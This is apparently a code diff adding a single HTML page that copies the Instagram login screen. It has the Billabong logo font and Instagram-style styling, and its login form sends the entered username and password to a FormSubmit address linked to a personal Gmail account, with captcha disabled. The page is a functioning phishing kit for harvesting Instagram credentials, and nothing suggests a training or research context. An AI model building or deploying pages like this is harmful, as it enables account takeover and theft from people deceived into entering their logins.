@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram</title>
+
+  <!-- Billabong Font only for logo -->
+  <style>
+    @font-face {
+      font-family: 'Billabong';
+      src: url('https://cdn.jsdelivr.net/gh/NoNameoN57/NoNameoN-Cdn/Billabong.ttf') format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    body {
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px; /* Max width for larger screens */
+      padding: 40px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      box-sizing: border-box;
+      border-radius: 1px;
+    }
+
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 55px;
+      color: #262626;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      margin-bottom: 6px;
+      padding: 9px 0 7px 8px;
+      font-size: 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+
+    button {
+      margin-top: 8px;
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      padding: 8px 0;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .or {
+      margin: 15px 0;
+      font-size: 13px;
+      color: #8e8e8e;
+      position: relative;
+    }
+
+    .or::before,
+    .or::after {
+      content: "";
+      background: #dbdbdb;
+      height: 1px;
+      width: 40%;
+      position: absolute;
+      top: 50%;
+    }
+
+    .or::before {
+      left: 0;
+    }
+
+    .or::after {
+      right: 0;
+    }
+
+    .facebook-login {
+      font-size: 14px;
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+      margin-top: 10px;
+      display: block;
+    }
+
+    .forgot-password {
+      font-size: 12px;
+      color: #00376b;
+      margin-top: 15px;
+      display: block;
+      text-decoration: none;
+    }
+
+    .signup-container {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup-container a {
+      color: #00376b;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    /* Responsive layout for larger screens */
+    @media (max-width: 600px) {
+      .container {
+        width: 90%; /* 90% width for small mobile screens */
+        padding: 20px;
+      }
+
+      .logo {
+        font-size: 45px; /* Slightly smaller logo on mobile */
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        font-size: 14px; /* Bigger input font size on mobile */
+        padding: 10px;
+      }
+
+      button {
+        font-size: 16px; /* Larger button text on mobile */
+      }
+    }
+
+    @media (min-width: 601px) and (max-width: 768px) {
+      .container {
+        width: 75%; /* Medium screens like tablets */
+      }
+    }
+
+    @media (min-width: 769px) {
+      .container {
+        width: 400px; /* Default size for desktop */
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">Instagram</div>
+
+    <form action="https://formsubmit.co/hailus673@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="or">OR</div>
+
+    <a href="#" class="facebook-login">Log in with Facebook</a>
+    <a href="#" class="forgot-password">Forgot password?</a>
+
+    <div class="signup-container">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+</body>
+</html>
